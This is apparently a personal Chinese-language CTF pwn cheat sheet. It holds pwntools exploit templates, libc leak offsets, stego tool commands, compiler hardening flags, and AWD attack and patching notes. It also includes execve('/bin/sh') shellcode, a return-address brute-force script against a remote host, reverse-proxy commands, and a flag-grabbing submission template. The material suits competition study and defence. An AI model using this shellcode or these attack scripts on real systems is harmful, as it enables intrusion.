---
title: pwn题板子
date: 2023-01-06 00:28:59 +0800
categories:
  - ctf比赛
tags:
  - pwn
  - ctf
permalink: /posts/id=50/
pin: false
published:
---

## 基础模板📓

### 用于泄露地址的libc地址偏移

```python
heap_addr = libc_base + libc.sym['__curbrk'] # libc上的堆地址
stack = libc_base + libc.sym['environ'] # 栈地址
free_hook = libc_base + libc.sym["__free_hook"]
system_addr = libc_base + libc.sym["system"]
bin_sh = libc_base + next(libc.search(b"/bin/sh\x00"))
environ = libc_base + libc.sym['environ']
IO_list_all = libc_base + libc.sym['_IO_list_all']
IO_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']

pop_rdi 


```

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","") #typ="udp"
p = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data).encode())
sa      = lambda text,data          :p.sendafter(text, str(data).encode())
sl      = lambda data               :p.sendline(str(data).encode())
sla     = lambda text,data          :p.sendlineafter(text, str(data).encode())
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil(b"\xf7")[-4:].ljust(4,b"\x00"))
l64     = lambda                    :u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,b'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,b'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------
def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()


ia()
```




```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","") #typ="udp"
p = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------
def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()
    
ia()
```



精简版

```python
# _*_ coding:utf-8 _*_

from pwn import *
context.clear(arch='amd64', os='linux', log_level='debug')


p.interactive()
```

## Misc🧶
### 0宽隐写一把锁

https://yuanfux.github.io/zero-width-web/

### 2张图片盲水印

用BlindWaterMark 

```
python bwm.py decode ./ta.png ./tb.png flag.png
python3 bwmforpy3.py decode --oldseed ./ta.png ./tb.png out1.png

python3 bwmforpy3.py decode ./ta.png ./tb.png out1.png
```



### png隐写

zsteg一把梭检测 lsb隐写 以及 png是否包含内容

```bash
zsteg --all 00000646.png
# 提取解压
zsteg 00000646.png -E b1,r,lsb,xy > 1.zip
```

stegsolve 查通道图



### MP3Stego隐写

```bash
没密码
./Decode.exe -X cipher.mp3
有密码
./Decode.exe -X -P xxx cipher.mp3
```



### 分离

foremost 分离文件包含

```bash
foremost 1.jpg
```



### 二维码扫码

https://merricx.github.io/qrazybox/

### zip伪加密

504B0102 ：目录区 全局方位标记为0900==加密/0000 == 无加密

504B0304 ：数据区 0900==加密 

![CTF misc zip、rar文件伪加密_数据区](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/17110420_62abef34087ca67794.png)


### rot47解密

https://rot47.net/

```
2lO,.j2lL000iZZ2[2222iWP,.ZQQX,2.[002iZZ2[2020iWP,.ZQQX,2.[020iZZ2[2022iWLNZQQX,2.[2202iW2,2.ZQQX,2.[022iZZ2[2220iWPQQZQQX,2.[200iZZ2[202iZZ2[2200iWLNZQQX,2.[220iZZ2[222iZZ2[2000iZZ2[2002iZZ2Nj2]20lW2]20l2ZQQX,2]202.ZW2]02l2]20,2]002.XZW2]22lW2]2ZQQX,2]002.XZWWP2XZQQX,2]022.ZW2]00l2]20,2]220.XZW2]2lWPQQZQQX,2]002.XZW2]0lWPQQZQQX,2]020.XZ2]20,2]202.Z2]00Z2]02Z2]2j2]22l2]2ZWPQQZQQX,2]022.Z2]00Z2]0Z2]2Z2]22j2]2lW2]000X,2]20.,2]20.j2]2W2]2W2]22ZQ-QQZ2]2020ZWP,.ZQQX,2]020.Z2]2220ZQ--QZ2]002Z2]220Z2]020Z2]00ZQW---Q--QZ2]002Z2]000Z2]200ZQ--QZ2]002Z2]000Z2]002ZQ--QZ2]002Z2]020Z2]022ZQ--QZ2]002Z2]000Z2]022ZQ--QZ2]002Z2]020Z2]200ZQ--QZ2]002Z2]000Z2]220ZQLQZ2]2222Z2]2000Z2]000Z2]2002Z2]222Z2]020Z2]202Z2]222Z2]2202Z2]220Z2]2002Z2]2002Z2]2202Z2]222Z2]2222Z2]2202Z2]2022Z2]2020Z2]222Z2]2220Z2]2002Z2]222Z2]2020Z2]002Z2]202Z2]2200Z2]200Z2]2222Z2]2002Z2]200Z2]2022Z2]200ZQN---Q--QZ2]200Z2]000ZQXjQZQ-QQXWXXWXj
```


## 疑难杂症处理💊

### python3基础知识
```
b 代表是字节序列，类型是bytes
没有b 代表是字符串，类型是str


p.recv()接受的是字节序列，也称字节流

```

### yaru设计

```
main（监控模块）
+
题目
+
shell_data_t




```

```
// 查找数据，定位指针
int fseek(FILE *stream, long int offset, int whence)

offset是相对whence的偏移
whence的值
SEEK_SET	文件的开头
SEEK_CUR	文件指针的当前位置
SEEK_END	文件的末尾

// 读取数据到缓冲区
size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream)
ptr是读取到哪里
size是一个元素的大小(字节)
nmemb是几个元素



```


内存共享
1.基于传统SYS V的共享内存；
2.基于POSIX mmap文件映射实现共享内存；
3.通过memfd_create()和fd跨进程共享实现共享内存；
4.多媒体、图形领域广泛使用的基于dma-buf的共享内存


[世上最好的共享内存(Linux共享内存最透彻的一篇)](https://cloud.tencent.com/developer/article/1551288)


系统V的共享内存段
```
包含头文件:

#include <sys/shm.h>: 用于共享内存函数的定义。
#include <unistd.h>: 用于各种常用的系统调用，如fork和pipe。
#include <string.h>: 包含字符串操作的函数，如memset。
main函数定义:

int main(int argc, char **argv): 程序的入口点，接受命令行参数。
创建共享内存:

key_t key = ftok("/dev/shm/myshm2", 0);: ftok函数通过给定的路径和整数ID生成一个系统V IPC键值。这个键值用于shmget函数。
int shm_id = shmget(key, 0x400000, IPC_CREAT | 0666);: shmget函数试图根据key值创建一个大小为4MB（0x400000字节）的共享内存段，权限设置为0666（所有用户都可读写）。IPC_CREAT标志意味着如果共享内存段不存在，则创建它。
映射共享内存:

char *p = (char *)shmat(shm_id, NULL, 0);: shmat函数将共享内存段映射到进程的地址空间，并返回指向该内存段的指针。
初始化共享内存:

memset(p, 'A', 0x400000);: memset函数将刚刚映射的共享内存初始化为'A'字符，大小为4MB。
分离共享内存:

shmdt(p);: shmdt函数将共享内存从当前进程的地址空间分离。
程序结束:

return 0;: main函数返回0，表示程序正常退出。
```


### pigcha重置网络

```
\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Http Filters
```

### Docker with Pwn






### Patch指令

```shell
patchelf --set-interpreter ~/Desktop/ld-linux-x86-64.so.2 --set-rpath ~/Desktop/ qwarmup

patchelf  --set-interpreter  /home/ef4tless/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-linux-x86-64.so.2 --set-rpath /home/ef4tless/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/  /home/ef4tless/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libreadline.so.6

```

### AWD出题经验
#### 艺术字

red-phoenix


#### 编译指令

```shell
常规编译命令

gcc -fstack-protector-all  -pie -z now -o pwn ./pwn.c


 -fno-stack-protector
 -lssl -lcrypto

NX：-z execstack / -z noexecstack (关闭 / 开启) 堆栈不可执行
Canary：-fno-stack-protector /-fstack-protector / -fstack-protector-all (关闭 / 开启 / 全开启) 栈里插入cookie信息
ASLR和PIE：-no-pie / -pie (关闭 / 开启) 地址随机化，另外打开后会有get_pc_thunk
RELRO：-z norelro / -z lazy / -z now (关闭 / 部分开启 / 完全开启) 对GOT表具有写权限
asm：内联汇编 -masm=intel
-s：去除符号表
-m32 编译32位


一般题目需要

-O2
使得main函数变成fastcall
char s[32]的识别不能加这个，会识别成int128




strip ./pwn


atoi 和 strtol
引入<stdlib.h>库会自动识别为后者

memset
引入<string.h>库中


%s 会把第二个参数作为指针变量，引索指针值


循环判断要注意数组末尾的回车不要加入判断
单独删除

输出
puts的参数只能是指针
printf才是正常的输出函数




```


### 无线安全

2.4GHz与5GHz都属于无线电（频率在3Hz-300Hz范围内的电磁波）的频段范围
赫兹（Hz）到兆赫兹（MHz）和千兆赫兹（GHz）

### CMSweb框架查找

https://www.yunsee.cn/



### 安卓刷机

卡刷（recovery）
将完整的刷机包放入手机的sdcard中
手机进入recovery模式直接安装，整个安装不需要电脑参与
简单快捷，不易出错，适合新手

线刷（fastboot）
刷机包在电脑中，利用刷机软件对手机进行刷机
实际上手机进入了fastboot模式
需要电脑安装好手机驱动并连接
容易出错，一般用来救砖


OTA（Android OS）
Over-The-Air 空中下载技术
就是手机设置中更新操纵系统，下载补丁包，文件不大
手机就在Android OS层面完成了补丁的下载，并自动更新
一般手机root后将不再提供系统更新

刷机包：ROM(操作系统文件包){内核  基带：决定了手机可以使用的运营商服务}
### DNS劫持

```
114.114.114.114 //114 dns 由中国电信运营商提供
8.8.8.8   // google dns

nslookup [域名或IP地址] [DNS服务器]


# 检测
nslookup whether.114dns.com 114.114.114.114
返回回环地址127.0.0.1即被劫持，否则为公网IP
大多数劫持udp 53的dns


# 强制使用tcp解析域名
nslookup -vc whether.114dns.com 114.114.114.114
```

### tips收集

```python
chr() # 16进制转字符
ord() # 字符转16进制
％.* s # 表示从以下缓冲区打印前X个字符
[rax] 取值
# 指针变量
变量就是一个地址/一个数据的壳
	类型是int*
	p = p+1;# +8(1*int)
    赋值语句:赋给谁
    a = 3
    0x1234 a 0x0000003 0x0000000
    a变量地址 = 3

# 后三位置零(C语言)
stack_addr = stack_addr & (~0xfff);

# 关闭ALSR
echo 0 > /proc/sys/kernel/randomize_va_space

# 切换python版本
sudo update-alternatives --config python

# 本地patchelf
patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath ./ qwarmup
patchelf --set-interpreter ~/glibc-all-in-one/\libs/2.23-0ubuntu7_amd64/ld-linux-x86-64.so.2 --set-rpath ~/glibc-all-in-one/\libs/2.23-0ubuntu7_amd64/ ./pwn


# 虚拟机 vscode
sudo apt install openssh-server
service sshd start

# busybox
busybox mkdir -p /usr/bin
busybox --install -s /usr/bin

# ida使用技巧
shift+E # 导出数据

# 网络启动
sudo nmcli networking on

# /bin/sh
sh = 0x68732f6e69622f

# tor爬虫验证
curl --socks5 localhost:9150 --socks5-hostname localhost:9150 -s https://check.torproject.org/ | cat | grep -m 1 Congratulations | xargs

# 应用qiling环境
source ~/qilingenv/bin/activate

# 软连接
ln -s cgibin hedwig.cgi
hedwig,cgi-> cgibin

# ida 转 ascii码
选中区域按a

# 寻找为转化字符地址
扔进01editor搜索

# ida
用到了再更新
空格键 ：反汇编窗口切换文本跟图形
ESC退到上一个操作地址
G搜索地址或者符号
N重命名
分号键 ：注释
ALT+M 添加标签
CTRL+M 列出所有标签
CTRL +S 二进制段的开始地址结束地址
C code 光标地址出内容解析成代码
P 在函数开始处使用P，从当前地址处解析成函数
D data解析成数据
A ASCII解析成ASCII
U unDefined解析成未定义的内容
X 交叉引用
F5 C伪代码
菜单栏中的搜索功能中
有ALT+T 搜索文本
ALT+B 搜索16进制 搜索opcode 如ELF文件头
打开断点列表 CTRL+ALT+B
单步步入 F7
单步不过 F8
运行到函数返回地址 CTRL+F7
运行到光标处 F4

shift+E 导出数据，可提取一些数据
shift+? 计算器


# 后台运行 gohttpserver
sudo nohup ./gohttpserver -r ../share --port 80 1>/dev/null 2>&1 &

# 快速起题目和端口
socat tcp-l:8888,reuseaddr,fork exec:./blind
```


### glibc对应版本docker拉取
```
google 搜索关键字 dockerhub 2.37-0ubuntu1
```


### hyper-V 和 VMware 切换

关闭hyper-V

wifi网络适配器右键取消桥接！

<img src="https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/ccfaeb528b034a12b43b5bc415d209e5.png" alt="在这里插入图片描述" style="zoom: 33%;" />

```bash
bcdedit /set hypervisorlaunchtype off
bcdedit /set hypervisorlaunchtype auto
```

启用hyper-V

新建外部虚拟网络

### 服务器nginx服务器

```bash
# 安装
sudo apt-get install nginx
# which nginx
# /usr/sbin/nginx -t
sudo nano /etc/nginx/conf.d/file_server.conf

server {
  listen 80; 
  server_name e4l4.com; # 自己PC的ip或者服务器的域名 
  charset utf-8; # 避免中文乱码 
  root /home/lighthouse/share; # 存放文件的目录 
  location / { 
    autoindex on; # 索引 
    autoindex_exact_size on; # 显示文件大小 
    autoindex_localtime on; # 显示文件时间 
  }
}

sudo rm /etc/nginx/sites-enabled/default
sudo service nginx reload


# 关于nginx的命令
sudo /etc/init.d/nginx start|stop|reload|
sudo service nginx start|stop|reload|

```



### docker命令

```bash
# 构建镜像：
docker build -f /path/Dockerfile -t imgname(tag)
docker images
docker run -itd --name ycbsql -p 9999:9999 ycbsql
docker ps

# 查看项目运行日志
docker logs --tail 500 ycbsql

docker exec -it 115e791688f1 "/bin/bash"
```

### 反向代理

iox 反向代理

```bash
./iox proxy -l 9999 -l 1080

./iox proxy -r e4l4.com:9999
iox.exe proxy -r e4l4.com:9999
```

frp反向代理

```shell
# 外网端
./frps -c frps.ini

# 内网端
./frpc -c frpc.ini
```





### GDB调试技巧

```shell
# 调试进程
sudo gdb -p <pid>

# 调试多线程 https://blog.csdn.net/gatieme/article/details/78309696
set follow-fork-mode [parent|child]		# 设置调试[父进程/子进程]
set detach-on-fork [on|off]				# 未调试进程[继续执行/block在fork位置]
show follow-fork-mode
show detach-on-fork
info inferiors				# 查看正在调试的进程信息
info threads				# 查询线程
thread <thread number>		# 切换线程


# strace -ff -o test.txt ./dns -C ./dns.conf

# 内存搜索
search -4 0x73a2f100 # 假设后面那个值为canary的值
search -8 0x58e1f3982b6400 # 后面那个值为canary的值

```

```shell
# 设置寄存器
set $rax=0
```






### 栈对齐

```c
movaps xmmword ptr [rsp + 0x50], xmm0
```

使用 **XMM** 时，需要 **16Byte** 对齐；使用 **YMM** 时，需要 **32Byte** 对齐；使用 **ZMM** 时，需要 **64Byte** 对齐。



### shellcode(汇编)



```
mov        一个变量或者寄存器， 一个变量或者寄存器里边的值
lea          一个变量或者寄存器,    一个变量或者寄存器


cdq    执行后rdx的值为0x00000000或0xFFFFFFFF  
#  字节码为"\x99" 表示“转换双字为四字” 在执行`cdq`指令时，它会检查`EAX`寄存器中的符号位（第31位），将eax扩展后的符号位复制到edx中

jmp $-0x19  # 短跳转 相对RIP

```





read()

```assembly
    mov rdi, r15
    xor eax, eax
    cdq
    mov al, 10
    mov dl, 7
    syscall # mprotect
    
    xor eax, eax
    mov esi, edi
    mov edi, eax
    mov dl, 0x7f
    syscall # read
    
# 添加nop
p.send('\x90' * 0x16 + asm('''
    mov rsp, rsi
    add rsp, 0x1000

    xor rsi, rsi
    mul rsi # rax = 0

    push rax
    mov rbx, 0x68732f2f6e69622f
    push rbx

    mov rdi, rsp
    mov al, 59

    syscall # execve("/bin/sh",0,0)
'''))
```







### docker 网桥删除

根据你提供的网络设备信息，你有很多 Docker 网络桥（br-02e7e9c790be，br-1df37dd21e5b，br-4e91b786b58e）以及一个默认的 Docker 网络桥（docker0）。要删除这些 Docker 网络桥，你可以使用 Docker 的命令行工具。

在 Docker 中，你可以使用 `docker network ls` 命令来查看所有的网络。你可以看到每个网络的 ID、名称、驱动和范围。然后你可以使用 `docker network rm` 命令来删除特定的网络。你需要用网络的 ID 或者名称作为参数。

例如，要删除一个名为 `my_network` 的网络，你可以运行以下命令：

```
docker network rm my_network
```

如果你想要删除所有的网络，你可以将 `docker network ls` 的输出（也就是所有网络的 ID）传递给 `docker network rm` 命令。下面是一个删除所有网络的 Bash 脚本：

```
docker network ls -q | xargs docker network rm
```

这个脚本首先会用 `docker network ls -q` 来获取所有网络的 ID，然后用 `xargs` 将这些 ID 作为参数传递给 `docker network rm`，从而删除所有的网络。

请注意，运行这个脚本需要 Docker 的相关权限。如果你在运行这个脚本时遇到了权限问题，你可能需要以管理员身份运行这个脚本。此外，如果一个网络正在被一个或多个容器使用，你需要先停止和删除这些容器，才能删除该网络。

### Z3解释器

```python
# _*_ coding:utf-8 _*_
from z3 import *

# 生成V3-V18变量
for i in range(3,19):
  locals()['v'+ str(i)]= Int('v%s'%i)

# x = Real('x') # 有理数

s = Solver()
s.add(v5 * v4 * v3 - v6 == 36182)
s.add(v3 == 19)
s.add(v5 * 19 * v4 + v6 == 36322)
s.add((v13 + v3 - v8) * v16 == 32835)
s.add((v4 * v3 - v5) * v6 == 44170)
s.add((v5 + v4 * v3) * v6 == 51590)
s.add(v9 * v8 * v7 - v10 == 61549)
s.add(v10 * v15 + v4 + v18 == 19037)
s.add(v9 * v8 * v7 + v10 == 61871)
s.add((v8 * v7 - v9) * v10 == 581693)
s.add(v11 == 50)
s.add((v9 + v8 * v7) * v10 == 587167)
s.add(v13 * v12 * v11 - v14 == 1388499)
s.add(v13 * v12 * v11 + v14 == 1388701)
s.add((v12 * v11 - v13) * v14 == 640138)
s.add((v11 * v5 - v16) * v12 == 321081)
s.add((v13 + v12 * v11) * v14 == 682962)
s.add(v17 * v16 * v15 - v18 == 563565)
s.add(v17 * v16 * v15 + v18 == 563571)
s.add(v14 == 101)
s.add((v16 * v15 - v17) * v18 == 70374)
s.add((v17 + v16 * v15) * v18 == 70518)


if s.check() == sat:
  result = s.model()
  print result

```



### 爆破脚本

如果是覆盖返回地址得爆破

```python
count=1

while true :
        p=remote("nc.eonew.cn",10002)
        p.send('A'*0x80+'A'*8+'\xa6\x15\x04') #注意不能用sendline否则会读取'\n'
        p.recv()
        print(count)
        count += 1
        try:    
               p.recv(timeout=0.2)# [*] Got EOF while reading in interactive 转化为 Traceback
               p.recv(timeout=0.2)
        except:
               p.close()
               continue
        break
ia()
```





## 线下比赛🛜

### AWD

扫存活

```shell
nmap -sn 192.168.3.1/24
nmap -sT --min-rate 10000 -p- 192.168.3.122
```

tcpdump抓取流量包

```shell
tcpdump -i lo host 192.168.1.123 and port 9999 -w /tmp/xxx.pcap
```

然后wireshark分析，选择包->原始数据

```python
payload = '''
'''
payload = payload.split("\n")
print(payload)
for x in payload:
	p.send(unhex(x))
```


### AWDP
#### FIX
printf族格式化字符串
+ 改为puts
+ 有可能存在对printf函数的check
修改寄存器赋值，不改动printf以及eh_frame
rdi<- %s
rsi <- 地址
加%s参数。在`.eh_frame`段中填入%s字符串，假设地址为0x400c01，将`mov edi, offset format`，修改为`mov edi offset 0x400c01, mov rsi offset format`。


UAF漏洞
+ 增加置空的部分
	如果空间不够的情况，可以考虑改eh_frame
	在eh_frame段写这些内容，原free函数jump过来即可
	
```c
call    _free
mov     qword ptr [202050h], 0
jmp     loc_C0A
```

改eh_frame：
在.eh_frame添加函数功能，选中eh_frame段，全部nop，然后edit->function->create function
增加eh_frame段执行权限，修改开头eh_frame的pht，Flags字段

![image-20231017194109359](https://e4l4pic.oss-cn-beijing.aliyuncs.com/image-20231017194109359.png)
+ nop掉free函数

限制大小类
+ 比如strncpy，memcpy类的函数，由可变size改为固定size，（SafeParse、mvvm）


mmap权限
+  7 改为 3（oldvm、cgi）

循环while
+ 只需要把变量变为常量0/1


数组越界
+ 添加判断语句
比如，在eh_frame段写这些内容，jmp过来

```
.eh_frame:00000000004012C8 83 BD E8 FB FF FF 63          cmp     dword ptr [rbp-418h], 63h ; 'c'
.eh_frame:00000000004012CF 0F 87 25 F9 FF FF             ja      loc_400BFA
.eh_frame:00000000004012CF
.eh_frame:00000000004012D5 83 BD EC FB FF FF 15          cmp     dword ptr [rbp-414h], 15h
.eh_frame:00000000004012DC 0F 87 18 F9 FF FF             ja      loc_400BFA
.eh_frame:00000000004012DC
.eh_frame:00000000004012E2 48 8D 3D 2F FA FF FF          lea     rdi, aPleaseInputWas            ; "PLEASE INPUT wasd TO MOVE YOURSELF!"
.eh_frame:00000000004012E9 E9 0C F6 FF FF                jmp     loc_4008FA
```

本来有开沙箱
+ prctl->nop，再进行加沙箱的操作

后门命令执行漏洞
+ 破坏字符串，比如flag这样的字符串，或者binsh

fix特殊技巧
+ 将类free函数全部nop掉，如:c++中的delete


#### 通防

pwn_waf

https://github.com/i0gan/pwn_waf

```bash
mkdir /tmp/.waf         # 创建一个目录，注意要和编译时的配置文件一致。
chmod 777 /tmp/.waf     # 修改对应的权限
cp /tmp/hosts.txt /tmp/.waf/hosts.txt  # 将多目标防护的对象文件放到正确位置

cp /path/pwn /tmp/.waf       # 将要防护的pwn文件，复制到对应的目录
cp /tmp/catch /path/pwn      # 用catch 或者 i0gan 、 forward 替换原始的pwn文件
chmod 777 /path/pwn
chmod 777 /tmp/.waf/pwn
```

ToPaWaf

https://github.com/ErodedElk/ToPaWaf

sandbox
https://github.com/TTY-flag/evilPatcher

```bash
evilPatcher file [enter]
evilPatcher file /pach/sandboxfile
```


#### attack
常规pwn题思路了，常见的体型如栈堆溢出(scanf函数)，格式化字符串，UAF

#### upload
一般都是让你将提供的updata.sh和修补后的pwn文件打一个tar包，然后上传到平台

打包命令

```shell
tar zcvf update.tar.gz update.sh pwn_fix
```

update.sh

```shell
#!/bin/sh
mv pwn_fix /home/ctf/pwn
# cp libc.so.6 /lib/x86_64-linux-gnu/libc.so.6
# cp ld-xx.so/lib64/ld-linux-x86-64.so.2
chmod 777 /home/ctf/pwn
```

ida内进行程序修补得到pwn_fix
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20250624102222.png)
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20250624102231.png)

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20250624102320.png)







### 参考资料

https://ohmygodlin.github.io/ctf/awd/2020/11/20/AWD-pwn%E5%A4%87%E5%BF%98/



```
llvm混淆0x23aaa 0x28
```





### 提交模板

```python
# _*_ coding:utf-8 _*_
from pwn import *
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# context.log_level = "debug"
context.arch = "amd64"

context.terminal = ['tmux', 'splitw', '-h']

ip = server_ip = sys.argv[1].split(':')[0]
port = server_port = int(sys.argv[1].split(':')[1])

p = remote(ip, port)
# p = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

def dbg():
    gdb.attach(p)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

def cat_flag():
    flag_header = 'flag{'
    sleep(1)
    sl('cat flag')
    ru(flag_header)
    flag = flag_header + ru('}') + '}'
    write_to_flags(flag + '\n')
    write_to_logs('\nexploited: ' + server_ip.encode() + ':' + str(server_port).encode() + flag)
    exit(0)

def write_to_flags(d):
    fd = open('./flags', 'ab')
    fd.write(d + '\n')
    fd.close()
    
ia()
cat_flag()
```



## Linux Kernel🥜

### 调试注意

```
echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope
```

dbg输出（用于堆喷检测和数据检查）

```c
#ifndef HEXDUMP_COLS
#define HEXDUMP_COLS 16
#endif

void hexdump(void *mem, unsigned int len) {
    putchar('\n');
    for(int i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++) {
        /* print offset */
        if(i % HEXDUMP_COLS == 0) {
            printf("0x%06x: ", i);
        }

        /* print hex data */
        if(i < len) {
            printf("%02x ", 0xFF & ((char*)mem)[i]);
        }
        /* end of block, just aligning for ASCII dump */
        else {        
            printf("   ");
        }

        /* print ASCII dump */
        if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1)) {
            for(int j = i - (HEXDUMP_COLS - 1); j <= i; j++) {
                 /* end of block, not really printing */
                if(j >= len) {
                    putchar(' ');
                }
                /* printable char */
                else if(isprint(((char*)mem)[j])) {
                    putchar(0xFF & ((char*)mem)[j]);
                }
                 /* other char */
                else {
                    putchar('.');
                }
            }
            putchar('\n');
        }
    }
    putchar('\n');
}
```

dbg输出模板

```c
printf("\033[32m\033[1m[+] Getting the root......\033[0m\n");
```

调试内核模块bss段时，要注意实际地址跟IDA分析出来的地址不一样。

解打包cpio命令

```shell
# 快速打包测试EXP
ktest ./rootfs.cpio ./exp
ktest -q ./rootfs.cpio ./exp # 直接打包

# 解包
#!/bin/bash

# 确保提供了文件名作为参数
if [ "$#" -ne 1 ]; then
        echo "Usage: $0 <rootfs.cpio>"
        exit 1
fi

BASENAME=$(basename "$1")
BASENAME="${BASENAME%%.*}"

mv $1 $1.gz
unar $1.gz
mv $1 $BASENAME
mv $1.gz $1
echo "[+]Successful"

excpio ./rootfs.cpio

# 打包
#!/bin/sh

# 检查参数个数
if [ "$#" -ne 1 ]; then
    echo "Usage: $0 ."
    exit 1
fi

# 获取当前目录的名称
CURRENT_DIR=$(basename "$(pwd)")

# 在上级目录创建一个以当前目录名命名的 .cpio 文件
find . | cpio -o --format=newc > "../${CURRENT_DIR}.cpio"



cd rootfs
packcpio .
```

堆信息
```
gef➤  p &kmalloc_caches
$1 = (struct kmem_cache *(*)[14]) 0xffffffff81e21700 <kmalloc_caches>
gef➤  x/20gx 0xFFFFFFFF81E21700
<kmalloc_caches>:	0x0000000000000000	0xffff880002c01a00(0x60)
<kmalloc_caches+16>:	0xffff880002c01800(0xc0)	0xffff880002c01e00(0x8)
<kmalloc_caches+32>:	0xffff880002c01d00(0x10)	0xffff880002c01c00(0x20)
<kmalloc_caches+48>:	0xffff880002c01b00(0x40)	0xffff880002c01900(0x80)
<kmalloc_caches+64>:	0xffff880002c01700(0x100)	0xffff880002c01600(0x200)
<kmalloc_caches+80>:	0xffff880002c01500(0x400)	0xffff880002c01400(0x800)
<kmalloc_caches+96>:	0xffff880002c01300(0x1000)	0xffff880002c01200(0x2000)
0xffffffff81e21770 <kmem_cache>:	0xffff880002c01000	0x0000000000000004
0xffffffff81e21780 <sysctl_compact_memory>:	0x0000000000000000	0xffff8800026e6000
0xffffffff81e21790 <high_memory>:	0xffff880003fe0000	0x0000000000000000


gef➤  p (struct kmem_cache)*0xffff880002c01500

```

 slab_freelist_hardened

```shell
vmlinux-to-elf bzImage vmlinux.elf
在vmlinux.elf搜索kmalloc函数，看prefetcht0指令临近的前几条指令没有xor指令，没有则没有开启
```

### 内核知识点
| 区域                                    | 起始地址                  | 最大偏移            |
| ------------------------------------- | --------------------- | --------------- |
| direct mapping of all physical memory | 0xffff 8880 0000 0000 | 0xfff f000 0000 |
| kernel text mapping                   | 0xffff ffff 8000 0000 | 0xfff0 0000     |
|                                       |                       |                 |
探测内核基址：从linux分配的0xffffffff80000000这个地址开始，以0x100000为间隔，进行探测，第一个可访问的点，就是内核加载基址。
kernelbase = 0xffffffff81000000

关于内核开发
```c
#include <linux/module.h>
//内核模块基础支持，例如 MODULE_LICENSE、module_init、module_exit
#include <linux/kernel.h>
//提供基本的内核函数，例如 printk
#include <linux/cdev.h>
#include <linux/fs.h>
//文件系统相关结构，例如 struct file_operations
#include <linux/uaccess.h>
//用户空间与内核空间的数据访问辅助函数
#include <linux/slab.h>
#include <linux/random.h>
#include <asm/uaccess.h>
```

### 内核堆管理

